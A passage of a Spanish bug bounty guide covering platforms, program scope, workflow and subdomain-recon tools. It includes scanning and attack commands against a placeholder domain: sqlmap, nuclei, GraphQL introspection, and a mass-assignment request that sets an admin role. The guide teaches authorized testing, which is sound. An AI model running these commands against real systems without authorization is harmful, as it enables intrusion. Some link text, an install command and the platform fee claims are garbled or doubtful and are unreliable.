# bug bounty / Caza de vulnerabilidades — Guía Ultra-Detallada

## Índice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (2738 lineas)


1. [Introducción al Bug Bounty](#1-introducción-al-bug-bounty)
2. [Plataformas de Bug Bounty](#2-plataformas-de-bug-bounty) - 2.1 [HackerOne](#21-hackerone) - 2.2 [Bugcrowd](#22-bugcrowd) - 2.3 [Synack](#23-synack) - 2.4 [Intigriti](#24-intigriti) - 2.5 [YesWeHack](#25-yeswehack) - 2.6 O[penBugBounty](#26-openbugbounty) - 2.7 [Cobalt](#27-cobalt)
3. T[ipos de Programas](#3-tipos-de-programas) - 3.1 [Programas Públicos vs Privados](#31-programas-públicos-vs-privados) - 3.2 [VDP (Vulnerability Disclosure Program)](#32-vdp-vulnerability-disclosure-program) - 3.3 [Programas Gestionados (Managed)](#33-programas-gestionados-managed) - 3.4 [Programas On-Demand](#34-programas-on-demand)
4. [Interpretación del Scope](#4-interpretación-del-scope) - 4.1 [In-Scope vs Out-of-Scope](#41-in-scope-vs-out-of-scope) - 4.2 [Wildcard Domains](#42-wildcard-domains) - 4.3 [API Endpoints](#43-api-endpoints) - 4.4 [Rate Limiting](#44-rate-limiting) - 4.5 [Testing Limitations](#45-testing-limitations)
5. [Metodología de Trabajo](#5-metodología-de-trabajo) - 5.1 [Daily Workflow](#51-daily-workflow) - 5.2 As[set Discovery](#52-asset-discovery) - 5.3 [Subdomain Enumeration](#53-subdomain-enumeration) - 5.4 [Technology Identification](#54-technology-identification) - 5.5 [Vulnerability Scanning](#55-vulnerability-scanning) - 5.6 [Manual Testing](#56-manual-testing)
6. [Técnicas de Recon](#6-técnicas-de-recon) - 6.1 [subfinder](#61-subfinder) - 6.2 [assetfinder](#62-assetfinder) - 6.3 [amass](#63-amass) - 6.4 [httpx](#64-httpx) - 6.5 [gau (getallurls)](#65-gau-getallurls) - 6.6 [waybackurls](#66-waybackurls) - 6.7 [katana](#67-katana) - 6.8 [nuclei](#68-nuclei) - 6.9 [dalfox](#69-dalfox) - 6.10 [trufflehog](#610-trufflehog)
7. [vulnerabilidades comunes para Bounties](#7-vulnerabilidades-comunes-para-bounties) - 7.1 [xss (Cross-Site Scripting)](#71-xss-cross-site-scripting) - 7.2 [sqli (SQL Injection)](#72-sqli-sql-injection) - 7.3 [ssrf (Server-Side Request Forgery)](#73-ssrf-server-side-request-forgery) - 7.4 [IDOR (Insecure Direct Object Reference)](#74-idor-insecure-direct-object-reference) - 7.5 [rce (Remote Code Execution)](#75-rce-remote-code-execution) - 7.6 [Subdomain Takeover](#76-subdomain-takeover) - 7.7 [Improper Access Control](#77-improper-access-control) - 7.8 [Information Disclosure](#78-information-disclosure)
8. [Report Writing](#8-report-writing) - 8.1 [Estructura del Reporte](#81-estructura-del-reporte) - 8.2 [Vulnerability Title](#82-vulnerability-title) - 8.3 [Descripción](#83-descripción) - 8.4 [Impacto](#84-impacto) - 8.5 [Steps to Reproduce](#85-steps-to-reproduce) - 8.6 [PoC (Proof of Concept)](#86-poc-proof-of-concept) - 8.7 [Remediación](#87-remediación) - 8.8 [CVSS Score](#88-cvss-score)
9. [Comunicación con Triage](#9-comunicación-con-triage) - 9.1 [Profesionalismo](#91-profesionalismo) - 9.2 [Evidencia](#92-evidencia) - 9.3 [Response Times](#93-response-times) - 9.4 [Dispute Handling](#94-dispute-handling)
10. [Monetización](#10-monetización) - 10.1 [Promedio de Bounties por Plataforma](#101-promedio-de-bounties-por-plataforma) - 10.2 [Tasas de Triage/Mediación](#102-tasas-de-triagemediación) - 10.3 [Bounties por Severidad](#103-bounties-por-severidad) - 10.4 [Repeatabilidad](#104-repeatabilidad)
11. [Detección de Duplicados](#11-detección-de-duplicados) - 11.1 [Técnicas de Recon para Bugs Únicos](#111-técnicas-de-recon-para-bugs-únicos) - 11.2 [Timing: First to Report](#112-timing-first-to-report) - 11.3 [Niche Techniques](#113-niche-techniques)
12. [Comparativa de Plataformas](#12-comparativa-de-plataformas) - 12.1 [H1 vs Bugcrowd vs Synack](#121-h1-vs-bugcrowd-vs-synack) - 12.2 [Fees](#122-fees) - 12.3 [Payout Speed](#123-payout-speed) - 12.4 [Program Quality](#124-program-quality) - 12.5 [Triage Quality](#125-triage-quality)
13. [Disclosure](#13-disclosure) - 13.1 [cve Assignment](#131-cve-assignment) - 13.2 Coordi[nated Disclosure](#132-coordinated-disclosure) - 13.3 [Publication Timing](#133-publication-timing) - 13.4 [Credit](#134-credit)
14. [Herramientas y Comparativas](#14-herramientas-y-comparativas) - 14.1 [Burp Pro vs ZAP vs Custom](#141-burp-pro-vs-zap-vs-custom) - 14.2 [Nuclei Templates Writing](#142-nuclei-templates-writing) - 14.3 [Custom Scanner Development](#143-custom-scanner-development)
15. Mindset del [bug bounty Hunter](#15-mindset-del-bug-bounty-hunter) - 15.1 [Persistencia](#151-persistencia) - 15.2 [Metodología](#152-metodología) - 15.3 [Documentación](#153-documentación) - 15.4 [Time Management](#154-time-management)
16. Ejercic[ios Prácticos](#16-ejercicios-prácticos)

---

## 1. Introducción al [bug bounty](../raw/b9g-b09nty.md)

El bug bounty es un programa donde empresas ofrecen recompensas económicas a investigadores de seguridad que encuentran y reportan vulnerabilidades en sus sistemas. No es un laburo tradicional — laburás por tu cuenta, elegís qué targets atacar, cuándo y cómo.

### Cómo funciona el ecosistema

El flujo básico es:

1. Te registrás en una plataforma de bug bounty ([hackerone](../raw/b9g-b09nty.md#hackerone), [bugcrowd](../raw/b9g-b09nty.md#bugcrowd), etc.)
2. Completás tu perfil (skills, experiencia, a veces requiren verificaciones)
3. Buscás programas que te interesen y estén dentro de tu skillset
4. Leés el scope del programa (qué está permitido y qué no)
5. Ejecutás tu metodología de [recon](../raw/0s1nt.md#reconocimiento) y testing
6. Encontrás una [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades)
7. Reportás con un PoC claro y detallado
8. El equipo de triage de la plataforma revisa tu reporte
9. El programa acepta, rechaza o pide más info
10. Si es válido, recibís el bounty (la recompensa)
11. Esperás el disclosure público (si aplica)

### Por qué importa el bug bounty hoy

Las empresas entienden que no pueden cubrir todo con equipos internos. El modelo de "crowdsourced security" permite tener cientos o miles de investigadores rompiendo sistemas constantemente. Para el investigador, es una forma de:

- Ganar plata haciendo lo que te gusta
- Construir un portfolio y reputación
- Aprender constantemente tecnologías nuevas
- Conectar con empresas top (Google, Facebook, Microsoft, Apple)
- Potencialmente conseguir laburo a través de la reputación en plataformas

### Estadísticas del mercado

- El mercado global de bug bounty se estima en más de $1.2B USD para 2025
- HackerOne ha pagado más de $300M USD en bounties desde su creación
- Bugcrowd ha pagado más de $100M USD
- Los top hackers pueden ganar $1M+ por año
- El bounty promedio ronda los $500-$2,000 USD para vulnerabilidades medias
- Para críticas, los bounties pueden ir de $5,000 a $100,000+

## 2. Plataformas de [bug bounty](../raw/b9g-b09nty.md)

### 2.1 [hackerone](../raw/b9g-b09nty.md#hackerone)

HackerOne es la plataforma más grande y reconocida. Fundada en 2012, tiene la mayor cantidad de programas y hackers.

**Características principales:**

- **Catálogo de programas:** Más de 2,500 programas activos incluyendo Google, Microsoft, PayPal, Nintendo, Twitter, Shopify, Uber, Airbnb
- **Modelo:** Principalmente programas gestionados (managed) con algunos públicos y privados
- **Hacktivity:** Feed público de vulnerabilidades reportadas y resueltas (útil para investigación)
- **Reputación:** Sistema de reputación basado en señales (reputation, signal, impact)
- **HackerOne Bounty:** Servicio de pagos gestionado por H1
- **HackerOne Challenges:** ctfs y challenges para practicar

**Cómo empezar en HackerOne:**

1. Crear cuenta en https://hackerone.com
2. Completar perfil con skills (Web, Mobile, Infrastructure, etc.)
3. Algunos programas privados requieren invitación basada en tu reputación
4. Programas públicos están abiertos a todos
5. Leer el disclosure guidelines del programa
6. Arrancar por programas VDP (sin recompensa) para ganar reputación

**Métrica de hacker en H1:**

```
Reputation:  Puntaje basado en reports válidos (-10 a +50 por reporte)
Signal: Precisión de tus reportes (reports aceptados / reports totales)
Impact: Suma de los CVSS scores de tus findings válidos
```

**Fees de HackerOne:**

- HackerOne cobra 20% del bounty al hacker (sobre el monto que paga el programa)
- Para programas gestionados, el fee puede ser distinto
- Pagos vía PayPal, Transferwise, ACH, o wire transfer

### 2.2 [bugcrowd](../raw/b9g-b09nty.md#bugcrowd)

Bugcrowd es la segunda plataforma más grande. Fundada en 2011.

**Características principales:**

- **Catálogo de programas:** Incluye Apple, Spotify, Atlassian, Tesla, Oracle, Twitter, Indeed, Valve
- **Bugcrowd University:** Recursos educativos gratuitos, cursos, webinars
- **CrowdControl:** Plataforma de gestión de vulnerabilidades
- **Nivel de investigador:** Basado en puntos de reputación, hay ranks (Elite, Pro, etc.)
- **VRT (Vulnerability Rating Taxonomy):** Guía de clasificación de vulnerabilidades con rangos de bounty sugeridos

**Cómo empezar en Bugcrowd:**

1. Registrarse en [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://bugcrowd.com
2. Completar perfil con habilidades y experiencia
3. Algunos programas requieren verification (ID check)
4. Acceder a programas públicos primero
5. Bugcrowd tiene "submission criteria" específicos para cada programa

**Fees de Bugcrowd:**

- Bugcrowd cobra 20% del bounty (similar a H1)
- Pagos mensuales o por bounty individual
- Opciones de pago: PayPal, Payoneer

**Bugcrowd VRT (Vulnerability Rating Taxonomy):**

Bugcrowd publica un documento llamado VRT que es básicamente el estándar de cómo clasifican bugs. Es re útil porque te dice exactamente:

- Qué vulnerabilidades pagan y cuánto
- Cómo se clasifica cada una (P1, P2, P3, P4)
- Ejemplos de cada tipo
- Condiciones de elegibilidad

podés encontrarlo en: https://bugcrowd.com/vrt

### 2.3 Synack

Synack es distinto. Es una plataforma "invitation-only" mucho más exclusiva.

**Características principales:**

- **Modelo:** Solo hackers verificados ([red team](../raw/r3d-t34m-1nfr4.md)
- **Synack [red team](../raw/r3d-t34m-1nfr4.md) (SRT):** Tenés que pasar un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de aplicación y examen
- **SmartScanning:** Escaneo automatizado + manual
- **Pagos:** Generalmente más altos que H1 y Bugcrowd
- **Misiones:** Tareas específicas asignadas a los hackers
- **Clientes:** Gobierno de USA, DoD, grandes empresas

**Cómo entrar a Synack:**

1. Aplicar en https://synack.com/[red](../raw/r3d3s-f0nd4m3nt0s.md)-team
2. Pasar un proceso de screening (background check)
3. Completar un examen técnico (web, mobile, network)
4. Demostrar habilidades en un entorno controlado
5. Una vez aceptado, te asignan misiones

**Fees de Synack:**

- No hay fee directo, pero los pagos son fijos por [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades)
- Pago semanal (!)
- Bounties más altos en promedio ($1,000-$10,000+)

### 2.4 Intigriti

Intigriti es una plataforma europea con buena reputación.

**Características principales:**

- **Catálogo:** Programas mayormente europeos (ING, KBC, Proximus)
- **Intigriti Academy:** Cursos y challenges de seguridad
- **Community:** Muy activa en Discord, eventos
- **1337Up:** Programa de [ctf](../raw/ctf-h4ckth3b0x.md) mensual con challenges
- **Bounties:** Competitivos con programas europeos

**Cómo empezar en Intigriti:**

1. Registrarse en https://www.intigriti.com
2. Verificar identidad (requieren ID verification)
3. Completar perfil
4. Programas públicos accesibles inmediatamente

**Fees de Intigriti:**

- 15% fee (menor que H1 y Bugcrowd)
- Pago vía PayPal o bank transfer

### 2.5 YesWeHack

YesWeHack es otra plataforma europea, #1 en Francia.

**Características principales:**

- **Catálogo:** Programas europeos y asiáticos (Orange, Swisscom, etc.)
- **#YesWeHack:** Enfoque en comunidad
- **DOJO:** Plataforma de entrenamiento
- **Bounties:** Buenos bounties europeos

**Cómo empezar:**

1. https://www.yeswehack.com
2. Verificación de identidad
3. Programas públicos y privados

### 2.6 OpenBugBounty

OpenBugBounty es distinto. No paga bounties económicos generales, es más un servicio de divulgación.

**Características principales:**

- **Modelo:** Disclosure público después de 90 días
- **Sin bounties:** Generalmente no hay recompensa económica
- **Fines:** Forzar a empresas a arreglar bugs
- **Público:** Cualquiera puede reportar

### 2.7 Cobalt

Cobalt (antes Cobalt.io) es una plataforma que se enfoca en pentesting como servicio.

**Características principales:**

- **Modelo:** Pentest as a Service con hunters verificados
- **Cobalt Core:** Equipo de pentesters verificados
- **Clientes:** Grandes empresas, requieren Cobalt Core membership
- **Pagos:** Por pentest completado, no por bounty individual

**Cómo entrar a Cobalt:**

1. Aplicar para Cobalt Core
2. Demostrar experiencia (pentesting profesional)
3. Rate: $50-$150/hora dependiendo de experiencia

## 3. Tipos de Programas

### 3.1 Programas Públicos vs Privados

**Programas Públicos:**

- Cualquier hacker registrado en la plataforma puede participar
- Generalmente son programas grandes y maduros
- Mayor competencia
- Bounties variables
- Más bugs duplicados
- Ejemplos: Google VRP, Microsoft [bug bounty](../raw/b9g-b09nty.md), PayPal

**Programas Privados:**

- Solo hackers invitados pueden participar
- Invitación basada en reputación y skills
- Menos competencia (20-200 hackers)
- Generalmente bounties más altos
- Targets más variados (no solo empresas gigantes)
- Mejor comunicación con el equipo de seguridad
- Mayor probabilidad de encontrar bugs únicos

**Cómo conseguir invitaciones a programas privados:**

1. Reportar bugs de calidad en programas públicos
2. Participar en la comunidad (Discord, Twitter, foros)
3. Tener buena señal en [hackerone](../raw/b9g-b09nty.md#hackerone) (Signal > 5, Reputation > 100)
4. A veces los programas privados invitan basado en tu hacktivity
5. Algunos programas tienen "rapid invitations" para nuevos hackers

### 3.2 VDP (Vulnerability Disclosure Program)

Los VDP son programas que aceptan reportes de vulnerabilidades pero **no ofrecen recompensa económica**.

**Características:**

- Sin bounty
- Ideal para ganar reputación
- Baja competencia
- Empresas que quieren mejorar su seguridad pero no tienen presupuesto para bounties
- Algunos te dan swag (remeras, stickers) o [reconocimiento](../raw/0s1nt.md#reconocimiento)]( en hall of fame

**Por qué hacer VDP:**

1. Ganar reputación en plataformas
2. Construir un portfolio de reportes
3. Practicar técnicas nuevas
4. A veces los VDP se convierten en programas con bounty
5. Networking con equipos de seguridad

### 3.3 Programas Gestionados (Managed)

Donde la plataforma (H1, [bugcrowd](../raw/b9g-b09nty.md#bugcrowd)) gestiona activamente el programa.

**Características:**

- La plataforma hace triage de todos los reportes
- Respuesta más rápida
- Bounties garantizados según la tabla del programa
- SLA definidos (Service Level Agreements)
- Mediación en disputas

### 3.4 Programas On-Demand

Programas que se activan por períodos específicos.

**Características:**

- Duración limitada (1-4 semanas)
- Objetivos específicos
- Competencia intensa
- Bounties bonus por findings críticos
- Ejemplo: Bugcrowd "Crowd" events

## 4. Interpretación del Scope

Esta es **la parte más importante** del [bug bounty](../raw/b9g-b09nty.md). Si no entendés el scope, podés:

1. Reportar bugs out-of-scope (pierden tiempo)
2. Romper algo que no debías (problemas legales)
3. Perder plata porque el bug era válido pero fuera del programa
4. Que te banneen de la plataforma

### 4.1 In-Scope vs Out-of-Scope

**In-Scope (dentro del alcance):**

- Generalmente son URLs o dominios específicos
- Subdominios bajo wildcard (ej: *.ejemplo.[com](../raw/w1n-s9bsyst3ms.md#com))
- Aplicaciones específicas (ej: app.ejemplo.com, api.ejemplo.com)
- Tipos de vulnerabilidades)es específicas que el programa quiere
- A veces solo ciertos tipos de pruebas están permitidos

**Out-of-Scope (fuera del alcance):**

- Propiedad de terceros (incluso si parece parte del programa)
- Aplicaciones viejas / [legacy](../raw/l3g4cy-3nt3rpr1s3.md)
- Servicios de infraestructura ([dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) servers, email servers)
- Denial of Service (DoS/DDoS) — casi siempre prohibido
- [social engineering](../raw/ph1sh1ng.md#ingenieria-social) / [phishing](../raw/ph1sh1ng.md) — casi siempre prohibido
- Physical attacks
- Vulnerabilidades que ya fueron reportadas
- Self-[xss](../raw/w3b-h4ck1ng.md#xss) (que solo se afecta a sí mismo)
- Missing [http](../raw/r3d3s-f0nd4m3nt0s.md#http) headers (generalmente out-of-scope en programas grandes)

**Cómo leer un scope:**

Siempre leé el programa policy completo. No asumas nada. Ejemplo real:

```
IN SCOPE: *.ejemplo.com *.api.ejemplo.com *.admin.ejemplo.com

OUT OF SCOPE: *.blog.ejemplo.com (tercero) *.help.ejemplo.com (tercero) Rate limiting issues Missing security headers Self-XSS DoS attacks Physical security Social engineering
```

### 4.2 Wildcard Domains

Un wildcard domain es cuando el programa acepta testing en cualquier subdominio bajo un dominio principal.

**Ejemplo de scope wildcard:**

```
*.ejemplo.com
```

Esto significa que **cualquier subdominio** de ejemplo.com está in-scope: admin.ejemplo.com, api.ejemplo.com, dev.ejemplo.com, staging.ejemplo.com, etc.

**Problemas con wildcards:**

- El wildcard puede ser muy amplio
- Algunos wildcards incluyen miles de subdominios
- Tenés que descubrir los subdominios vos mismo
- Algunos subdominios pueden ser de terceros (pero igual aplica)

### 4.3 API Endpoints

Muchos programas ahora incluyen endpoints de API en su scope.

**Tipos de APIs comunes:**

- rest apis (json, xml)
- [graphql](../raw/4p1-s3cur1ty.md#graphql) APIs
- SOAP APIs
- WebSockets
- grpc

**Qué buscar en APIs:**

- IDOR en endpoints
- Mass assignment
- [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting) bypass
- GraphQL introspection
- Broken authentication
- Excessive data exposure
- [ssrf](../raw/w3b-h4ck1ng.md#ssrf)
- Injection

**Cómo testear APIs:**

```bash
# Probar un endpoint REST básico
curl -X GET "https://api.ejemplo.com/v1/users/123" \ -H "Authorization: Bearer token123"

# GraphQL introspection query
curl -X POST "https://api.ejemplo.com/graphql" \ -H "Content-Type: application/json" \ -d '{"query":"{__schema{types{name fields{name}}}}"}'

# POST con datos maliciosos
curl -X POST "https://api.ejemplo.com/v1/users" \ -H "Content-Type: application/json" \ -H "Authorization: Bearer token123" \ -d '{"role":"admin","is_admin":true}'
```

### 4.4 Rate Limiting

El rate limiting es una medida de seguridad que limita cuántas requests podés hacer en un tiempo determinado.

**Por qué es out-of-scope a menudo:**

- La mayoría de programas consideran rate limiting issues como "bajo impacto"
- Muchos ya saben que tienen rate limiting débil
- No es un vulnerability real en sí mismo (a menos que permita ataques como brute force)

**Excepciones donde rate limiting sí es válido:**

- Si el rate limiting permite ataques de [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) a autenticación
- Si permite enumeración de usuarios
- Si permite bypass de otP/2FA
- Si permite ataques de gift card brute force

### 4.5 Testing Limitations

Cada programa tiene sus propias limitaciones. Leelas con atención.

**Limitaciones comunes:**

- **No automatización:** Algunos programas prohíben escaneos automatizados (nuclei, masscan)
- **No DoS:** Nunca hagas DoS/DDoS aunque no esté explícitamente prohibido
- **No social engineering:** No intentes phishing a empleados
- **No physical:** No entres a oficinas
- **No modificar datos:** No alteres datos de otros usuarios
- **No eliminar datos:** No borres nada
- **No escalar privilegios innecesariamente:** Si obtenés admin, reportalo sin escalar más
- **No pivotear:** No uses el acceso para atacar otros sistemas

**Responsabilidades del hacker:**

- Documentar todo
- Detener el test si encontrás PII
- Reportar inmediatamente si encontrás datos críticos
- No compartir información con terceros
- Destruir datos después del programa

## 5. Metodología de Trabajo

La metodología de [bug bounty](../raw/b9g-b09nty.md) es un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) cíclico y sistemático. No es solo "encontrar bugs al azar".

### 5.1 Daily Workflow

Un día típico de un bug bounty hunter:

```
06:00 - 07:00 Reviews de la mañana (emails, notificaciones, nuevos programas)
07:00 - 08:00 Análisis de programas nuevos, cambios de scope
08:00 - 10:00 Recon automático (subdomain discovery, URL gathering)
10:00 - 12:00 Escaneo automatizado (nuclei, dalfox, httpx probes)
12:00 - 13:00 Almuerzo
13:00 - 15:00 Análisis de resultados automáticos
15:00 - 17:00 Manual testing en targets interesantes
17:00 - 18:00 Documentación y escritura de reportes
18:00 - 19:00 Investigación de nuevas técnicas / writeups
```

Esto varía mucho según la persona. Algunos laburan de noche, otros de día. Lo importante es tener un flujo consistente.

**Mi workflow recomendado (6 pasos):**

1. **Target Selection:** Elegir 2-3 programas activos
2. **reconnaissance:** Descubrir todo el attack surface
3. **Scanning:** Escaneo automatizado con herramientas
4. **Analysis:** Revisar resultados y priorizar
5. **exploitation:** Manual testing de los findings más prometedores
6. **Reporting:** Escribir reportes detallados

### 5.2 Asset Discovery

Asset discovery es el proceso de encontrar **todos** los activos asociados a un programa. No solo los que están en el scope listados.

**Técnicas de asset discovery:**

1. **Certificate Transparency (CT) Logs:** - crt.sh - CertSpotter - Google Transparency Report

2. **[dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) Records:** - A, AAAA, CNAME, MX, NS, TXT records - [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) zone transfer (raro pero a veces funciona)

3. **Search Engines:** - [google dorks](../raw/0s1nt.md#google-dorks) - Bing, [shodan](../raw/0s1nt.md#shodan), Censys - GitHub dorks

4. **Passive [recon](../raw/0s1nt.md#reconocimiento):** - WHOIS lookups - Reverse [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) lookups - ASN enumeration

**Ejemplo práctico de asset discovery:**

```bash
# Usando crt.sh para encontrar subdominios
curl -s "https://crt.sh/?q=%25.ejemplo.com&output=json" | jq -r '.name_value' | sort -u

# Usando Subfinder (rápido)
subfinder -d ejemplo.com -o subdomains.txt

# Usando Amass (lento pero completo)
amass enum -d ejemplo.com -o amass_output.txt

# Combinando resultados
cat subdomains.txt amass_output.txt | sort -u > all_subs.txt
```

### 5.3 Subdomain Enumeration

La enumeración de subdominios es probablemente la habilidad más importante en bug bounty.

**Técnicas:**

1. **Pasiva (sin tocar el target):** - CT logs (crt.sh, certspotter) - Search engines (Google, Bing) - DNS dumpster - Shodan/Censys - Wayback Machine (archive.org) - GitHub (commits, issues, wikis)

2. **Activa (resolviendo DNS):** - DNS brute force (subdominios comunes) - DNS resolver (puredns, massdns) - Permutation scanning (alteraciones de subdominios conocidos)

3. **Scraping:** - Katana (crawling) - Gau (getallurls) - Waybackurls

**Wordlists para subdomain brute force:**

- `subdomains-top1million-5000.txt` (SecLists)
- `subdomains-top1million-20000.txt` (SecLists)
- `commonspeak2_subdomains.txt`
- `all.txt` (best-dns-wordlist)
- `sorted_knock_dnsrecon_fierce_recon.txt`

**Ejemplo de subdomain enumeration completo:**

```bash
# 1. Pasivo con Subfinder
subfinder -d ejemplo.com -all -o subfinder.txt

# 2. CT Logs
curl -s "https://crt.sh/?q=%25.ejemplo.com&output=json" \ | jq -r '.name_value' | sort -u > crtsh.txt

# 3. Amass pasivo
amass enum -passive -d ejemplo.com -o amass_passive.txt

# 4. Wayback URLs
echo "ejemplo.com" | waybackurls | cut -d/ -f3 | sort -u > wayback_subs.txt

# 5. Unificar
cat subfinder.txt crtsh.txt amass_passive.txt wayback_subs.txt \ | sort -u > all_subs_raw.txt

# 6. Resolver subdominios vivos
httpx -l all_subs_raw.txt -o alive_subs.txt -silent

# 7. Probar puertos comunes
httpx -l all_subs_raw.txt -ports 80,443,8080,8443,3000,5000,9000 \ -o alive_subs_all_ports.txt
```

### 5.4 Technology Identification

Una vez que tenés los subdominios vivos, identificá qué tecnologías usan.

**Para qué sirve:**

- Saber qué vulnerabilidades buscar (WordPress? Apache? Nginx? Node? React?)
- Version identification (buscar cves específicos)
- Identificar WAFs y configuraciones de seguridad
- Encontrar tecnologías inusuales

**Herramientas:**

```bash
# httpx con detección de tecnologías
httpx -l alive_subs.txt -tech-detect -o tech_output.txt

# WhatWeb
whatweb -i alive_subs.txt --log-json=whatweb.json

# Wappalyzer CLI
wappalyzer-cli analyze https://ejemplo.com

# Shodan search
shodan search "ssl.cert.subject.cn:ejemplo.com"
shodan search "http.html:ejemplo.com" --fields ip_str,port,org,hostnames
```

**Qué buscar según la tecnología:**

| Tecnología | Vulnerabilidades comunes |
|------------|-------------------------|
| WordPress | Plugin vulns, [xss](../raw/w3b-h4ck1ng.md#xss), [sqli](../raw/w3b-h4ck1ng.md#sql-injection), [lfi](../raw/w3b-h4ck1ng.md#lfi) |
| Joomla | SQLi, XSS, ACL bypass |
| Drupal | [rce](../raw/w3b-h4ck1ng.md#rce) (Drupalgeddon), XSS |
| Apache | Path traversal, mod_status, server-status |
| Nginx | Alias traversal, misconfiguration |
| Node.js/Express | Prototype pollution, RCE |
| Django | SQLi, XSS, [csrf](../raw/w3b-h4ck1ng.md#csrf) |
| React/Vue | XSS, client-side injection |
| PHP | LFI, [rfi](../raw/w3b-h4ck1ng.md#rfi), RCE, deserialization |
| Java/Spring | SpEL injection, deserialization, RCE |
| Ruby/Rails | Mass assignment, SQLi |
| [graphql](../raw/4p1-s3cur1ty.md#graphql) | Introspection, DoS, injection |

### 5.5 Vulnerability Scanning

El scanning automatizado te da una lista de posibles vulnerabilidades para investigar manualmente.

**Flujo de scanning:**

```bash
# 1. Nuclei scanning (rápido y efectivo)
nuclei -l alive_subs.txt -o nuclei_output.txt

# 2. Nuclei con plantillas específicas
nuclei -l alive_subs.txt -t ~/nuclei-templates/cves/ \ -t ~/nuclei-templates/vulnerabilities/ -o nuclei_cves.txt

# 3. Escaneo de XSS con Dalfox
dalfox url -l xss_urls.txt -o dalfox_output.txt

# 4. Escaneo de open redirects
nuclei -l alive_subs.txt -t ~/nuclei-templates/misconfiguration/ \ -tags redirect -o redirects.txt

# 5. Secret scanning con TruffleHog
trufflehog filesystem --directory=/path/to/scraped/data

# 6. Escaneo de SQLi (limitado, no hacer demasiado si hay WAF)
sqlmap -u "https://ejemplo.com/page?id=1" --batch --level=3
```

**Nunca escanees sin autorización explícita.** Siempre verificá las políticas del programa primero.

### 5.6 Manual Testing

El testing manual es donde realmente encontrás bugs valiosos. Lo automatizado encuentra lo obvio; lo manual encuentra lo creativo.

**Áreas de testing manual:**

1. **Business Logic:** - Flujo de autenticación - Procesos de pago - Workflows de registro - Recuperación de contraseña - Flujo de 2FA

2. **IDOR (Insecure Direct Object Reference):** - `/user/123` -> cambiar a `/user/456` - `/api/v1/orders/ORDER-123` -> cambiar a `ORDER-456` - Parámetros UUID vs números secuenciales

3. **[input validation](../raw/s3c-f0nd4m3nt0s.md#validacion-de-entrada):** - Campos de texto (XSS, SQLi, SSTI) - [file upload](../raw/w3b-h4ck1ng.md#file-upload) (RCE, path traversal) - JSON/XML injection - LDAP injection - Nosql injection

4. **Authentication/Authorization:** - [jwt](../raw/4p1-s3cur1ty.md#jwt) token manipulation - Session handling - [oauth](../raw/hybr1d-1d3nt1ty.md#oauth) flow - [privilege escalation](../raw/l1n9x-pr1v3sc.md) (horizontal, vertical) - Role bypass

5. **Information Disclosure:** - Error messages - Debug endpoints - Source code comments - API documentation - .git/config exposure

**Checklist de testing manual (por sesión):**

```
 Revisar robots.txt
 Revisar sitemap.xml
 Revisar .well-known/
 Revisar headers de seguridad
 Revisar cookies (secure, httponly, samesite)
 Probar todos los endpoints de API
 Probar todos los parámetros GET/POST
 Probar file upload
 Probar autenticación (bypass, brute force)
 Probar autorización (privilege escalation)
 Probar IDOR en cada recurso
 Probar inputs inesperados (null, arrays, objects)
 Revisar source maps (JS)
 Revisar comentarios en HTML/JS
 Probar WebSockets
 Probar GraphQL (introspection, batching)
```

## 6. Técnicas de [recon](../raw/0s1nt.md#reconocimiento)

### 6.1 subfinder

**subfinder** es una herramienta de descubrimiento pasivo de subdominios. Es rápida, confiable y usa múltiples fuentes.

**Instalación:**

```bash
# Go install
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# O desde releases (Windows)
# Descargar de https://github.com/projectdiscovery/subfinder/releases
```

**Fuentes que usa subfinder:**

```
alienvault, anubis, archiveis, binaryedge, bufferover, censys,
certspotter, chaos, chinaz, c99, crtsh, dnsdb, dnsdumpster,
digitorus, dnslytics, facebook, fullhunt, github, hackertarget,
hunter, intelx, leakix, netlas, onyphe, passivetotal,
quake, rapiddns, redhuntlabs, rocketreach, securitytrails,
shodan, socradar, spyse, sslmate, subdomaincenter,
subdomainfinderc99, threatbook, threatcrowd, threatminer,
urlscan, virustotal, waybackarchive, whoisxmlapi, zoomeye
```

**Uso básico:**

```bash
# Búsqueda básica
subfinder -d ejemplo.com

# Guardar resultados
subfinder -d ejemplo.com -o subs.txt

# Usar todas las fuentes
subfinder -d ejemplo.com -all -o subs_all.txt

# Con API keys (más resultados)
# Configurar en ~/.config/subfinder/provider-config.yaml
subfinder -d ejemplo.com -all -o subs_with_apikeys.txt
```

**Configuración de APIs para subfinder:**

```yaml
# ~/.config/subfinder/provider-config.yaml
binaryedge: [API_KEY]
censys: [API_KEY]
certspotter: [API_KEY]
chaos: [API_KEY]
github: [API_KEY]
intelx: [API_KEY]
passivetotal: [API_KEY]
securitytrails: [API_KEY]
shodan: [API_KEY]
virustotal: [API_KEY]
```

### 6.2 assetfinder

**assetfinder** es otra herramienta de descubrimiento pasivo, de Tom on (tomnomnom).

**Instalación:**

```bash
go install github.com/tomnomnom/assetfinder@latest
```

**Uso:**

```bash
# Búsqueda básica
assetfinder ejemplo.com

# Búsqueda con subdominios solamente (--subs-only)
assetfinder --subs-only ejemplo.com

# Guardar resultados
assetfinder --subs-only ejemplo.com > assetfinder_subs.txt

# Diferencia: assetfinder no resuelve DNS, solo encuentra nombres
```

**Fuentes de assetfinder:**

```
Google, CERT-FR, crt.sh, ThreatCrowd, Facebook, Virustotal,
DNSDumpster, Riddler, Censys, etc.
```

### 6.3 amass

**amass** es la herramienta más completa pero más lenta. Hace tanto pasivo como activo.

**Instalación:**

```bash
# Usando Go
go install -v github.com/owasp-amass/amass/v4/..@master

# Configuración de APIs
# ~/.config/amass/config.ini
```

**Uso:**

```bash
# Enumeración pasiva (rápida)
amass enum -passive -d ejemplo.com -o amass_passive.txt

# Enumeración activa (lenta pero completa)
amass enum -active -d ejemplo.com -o amass_active.txt

# Con resolución DNS
amass enum -active -d ejemplo.com -config config.ini -o full_scan.txt

